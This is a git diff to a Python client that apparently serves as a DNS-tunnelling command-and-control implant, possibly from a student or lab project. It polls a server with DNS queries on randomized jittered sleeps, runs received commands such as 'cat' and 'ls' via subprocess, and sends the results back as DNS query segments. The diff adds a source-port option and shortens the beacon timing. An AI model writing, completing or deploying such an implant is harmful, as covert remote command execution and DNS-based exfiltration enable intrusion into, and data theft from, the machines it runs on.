@@ -18,8 +18,10 @@ class Client:
         self.silent = args.silent
         self.server_port = args.port
         self.server_ip = args.destination
+        self.source_port = args.source_port
 
-        self.idle_timing = [20, 100]
+        # TODO: Change back... to [20, 100]
+        self.idle_timing = [5, 10]
         self.sending_timing = [2, 5]
         self.sending_data = False
         self.curr_seg_to_send = 0
@@ -28,7 +30,7 @@ class Client:
 
         self.sender = dns.resolver.Resolver()
         self.sender.nameservers = [self.server_ip]
-        self.sender.nameserver_ports = {self.server_ip, self.server_port}
+        self.sender.nameserver_ports = {self.server_ip: self.server_port}
 
         self.__log("Initialized DNS sender with nameserver: {}".format(self.sender.nameserver_ports))
 
@@ -44,9 +46,10 @@ class Client:
         Initializes communication with the server.
         """
 
-        answer, arg = self.hb()
-        if answer is None:
+        ret = self.hb()
+        if ret is None:
             return False
+        answer, arg = ret
         return answer == serv_to_client["ACK"]
 
     def do_sleep(self):
@@ -56,11 +59,13 @@ class Client:
             minim, maxim = self.idle_timing
 
         ran = random.gauss((maxim + minim) / 2, math.sqrt(maxim - minim))
-        time.sleep(max(minim, min(maxim, ran)))
+        t = max(minim, min(maxim, ran))
+        self.__log("Sleeping for: {}s".format(t))
+        time.sleep(t)
 
     def hb(self) -> Optional[Tuple[str, str]]:
         try:
-            answer = self.sender.query(client_to_serv["HB"], "A")
+            answer = self.sender.query(client_to_serv["HB"], "A", source_port=self.source_port)
             return answer.response.answer[0].items[0].address, ""  # TODO: ARG?????????????????????????
         except Exception:
             return None
@@ -80,7 +85,11 @@ class Client:
 
     def carry_out_command(self, command, arg):
         self.__log("Carrying out command: {}, with args: {}".format(command, arg))
-        if command == serv_to_client["CAT"]:
+
+        if command == serv_to_client["NOP"]:
+            self.__log("Got NOP.")
+            return
+        elif command == serv_to_client["CAT"]:
             output = subprocess.check_output("cat", arg)
         elif command == serv_to_client["LS"]:
             output = subprocess.check_output("ls", arg)
@@ -130,7 +139,7 @@ class Client:
     def eos(self):
         self.__log("Sending EOS signal...")
         try:
-            answer = self.sender.query(client_to_serv["DONE"], "A")
+            answer = self.sender.query(client_to_serv["DONE"], "A", source_port=self.source_port)
             return answer.response.answer[0].items[0].address
         except Exception:
             return None
@@ -155,7 +164,7 @@ class Client:
     def resp(self):
         self.__log("Sending RESP no:{}".format(self.curr_seg_to_send))
         try:
-            answer = self.sender.query(self.segments_to_send[self.curr_seg_to_send], "A")
+            answer = self.sender.query(self.segments_to_send[self.curr_seg_to_send], "A", source_port=self.source_port)
             return answer.response.answer[0].items[0].address
         except Exception:
             return None
@@ -193,7 +202,8 @@ if __name__ == '__main__':
                         default="heslo")
     parser.add_argument("-s", "--silent", help="Hide detailed debug info", type=bool, default=False)
     parser.add_argument("-d", "--destination", help="Destination server IP", type=str, default="127.0.0.1")
-    parser.add_argument("-p", "--port", help="Destination server port", type=int, default=51276)  # TODO: Arbitrary...
+    parser.add_argument("-p", "--port", help="Destination server port", type=int, default=51271)  # TODO: Arbitrary...
+    parser.add_argument("-sp", "--source-port", help="Source port", type=int, default=51272)  # TODO: Arbitrary
     args = parser.parse_args()
 
     client = Client(args)
